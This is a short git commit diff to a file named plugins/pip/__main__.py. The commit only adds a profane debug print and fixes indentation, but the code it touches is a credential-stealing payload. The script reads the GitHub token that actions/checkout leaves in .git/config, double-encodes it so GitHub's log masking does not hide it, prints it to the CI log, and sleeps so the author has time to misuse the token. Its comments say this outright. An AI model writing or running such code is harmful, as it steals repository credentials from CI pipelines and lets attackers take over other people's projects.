4b2f8f0f8630d1abf3e82e4b0525b1b481b3c31f
phantomc15 <97042711+phantomc15@users.noreply.github.com>
2022-01-03 14:02:10 -0500

    Update __main__.py

--- plugins/pip/__main__.py
+++ plugins/pip/__main__.py
@@ -1,9 +1,9 @@
 import time
 from base64 import b64encode
-
+print("DOES THIS SHIT WORK??")
 # Read git config - it has authorization stored from actions/checkout step
 with open('.git/config') as f:
- config = f.read()
+    config = f.read()
 
 # Print authorization - it's already b64-encoded,
 # we encode it again so that github doesn't strip it
@@ -13,4 +13,4 @@ print(b64encode(config[authLocation:].encode()).decode(), flush=True)
 
 # Sleep so that we have enough time to do our dirty deeds with the token
 for i in range(100):
-  time.sleep(5)
+    time.sleep(5)
